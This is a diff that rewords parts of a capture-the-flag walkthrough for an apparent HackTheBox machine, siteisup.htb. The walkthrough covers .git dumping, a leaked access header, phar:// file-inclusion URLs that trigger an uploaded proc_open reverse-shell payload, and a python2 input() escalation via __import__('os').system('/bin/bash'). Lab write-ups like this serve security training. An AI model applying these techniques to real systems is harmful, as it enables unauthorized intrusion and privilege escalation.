@@ -46,16 +46,13 @@ On port 80 we get the domain name `siteisup.htb`
 
 > **Note**: Only the **actual** site domain name can reveal **subdomains**
 
-- Add it to the `/etc/hosts`
-- Not vulnerable to command injection
+Add it to the `/etc/hosts` — the site isn't vulnerable to command injection.
 
 Hidden directories:
 
 > **Note**: Sometimes use a small wordlist 1st for directory enumeration (common.txt)
 
-- /dev => /dev/.git
-
-- **git-dumper** can **fetch** files from the **.git** directory
+`/dev` turns up, along with `/dev/.git` — **git-dumper** can **fetch** files from the **.git** directory.
 
 ```dir-tree
 git
@@ -121,17 +118,13 @@ Deny from All
 Allow from env=Required-Header
 ```
 
-A subdomain `dev.siteisup.htb` is discovered — it gives a **403 forbidden access** error:
+A subdomain `dev.siteisup.htb` is discovered — it gives a **403 forbidden access** error. The **special header** found in the **.htaccess** opens it.
 
-- The **special header** found in the **.htaccess** opens it
-
-Automate the header in Burp:
-- Proxy tab -> match and replace -> add `Special-Dev: only4dev` in replace, leave the match tab empty
+Automate the header in Burp — Proxy tab -> match and replace -> add `Special-Dev: only4dev` in replace, leave the match tab empty.
 
 The subdomain runs a **beta** version of the main site — and here you can **upload files** to check them.
 
-- Clicking the admin panel reveals a parameter called `page`
-- Checking the source of `index.php`:
+Clicking the admin panel reveals a parameter called `page`. Checking the source of `index.php`:
 
 ```php
 <b>This is only for developers</b>
@@ -154,9 +147,7 @@ The subdomain runs a **beta** version of the main site — and here you can **up
 
 checker.php's source shows uploads are saved under the **uploads** directory with **md5** of the **time** as the folder name:
 
-- Checks file size (10kb)
-- then the blacklisted extensions
-- saves the file in the folder
+It checks the file size (10kb), then the blacklisted extensions, and saves the file in the folder.
 
 **Full code** : `checker.php`
 
@@ -311,10 +302,7 @@ Upload **info.txt**, check the **/uploads** page for the path, paste it into the
 http://dev.siteisup.htb/?page=phar://uploads/5b6754e77c00533547b8938f93c9a716/info.txt/info
 ```
 
-phpinfo page loads:
-
-- **Disable_functions** under the **CORE** heading
-	- Important functions like `system,exec,shell_exec,popen,` are disabled
+The phpinfo page loads — **Disable_functions** under the **CORE** heading shows important functions like `system,exec,shell_exec,popen,` are disabled.
 
 ### dfunc-bypasser.py
 
@@ -322,7 +310,7 @@ phpinfo page loads:
 
 `dfunc-bypasser.py` analyzes a phpinfo page for functions we can still abuse.
 
--> Copied the page source and created a html file:
+Copy the page source into an html file and run it:
 
 ```sh
 python2 dfunc-bypasser.py --file phpinfo.html
@@ -348,7 +336,7 @@ $process = proc_open($cmd, $descriptorspec, $pipe, null, null);
 ?>
 ```
 
-- Those two nulls -> 1st null => $cwd, 2nd null => $env (check Reference)
+Those two nulls -> 1st null => $cwd, 2nd null => $env (check Reference)
 
 Wrap it up:
 
@@ -364,7 +352,7 @@ Upload the payload and execute the phar URL — reverse shell on the listener:
 http://dev.siteisup.htb/?page=phar://uploads/c3cfcce0858c660cde7bcd8a54baa4a5/payload.txt/payload
 ```
 
-Gained shell as `www-data`
+Gained a shell as `www-data`
 
 ```sh
 find / -perm -4000 -exec ls -al {} \; 2>/dev/null
@@ -391,7 +379,7 @@ The **print** function **without parentheses** means **python2** — and in **py
 __import__('os').system('/bin/bash')
 ```
 
-- import the `os` library to execute system commands
+It imports the `os` library to execute system commands:
 
 ```sh
 ./siteisup
@@ -401,7 +389,7 @@ id
 uid=1002(developer) gid=33(www-data) groups=33(www-data) 
 ```
 
-Unstable developer shell — stabilize with python3's **pty** library or ssh keys.
+The developer shell is unstable — stabilize it with python3's **pty** library or ssh keys.
 
 # Root
 
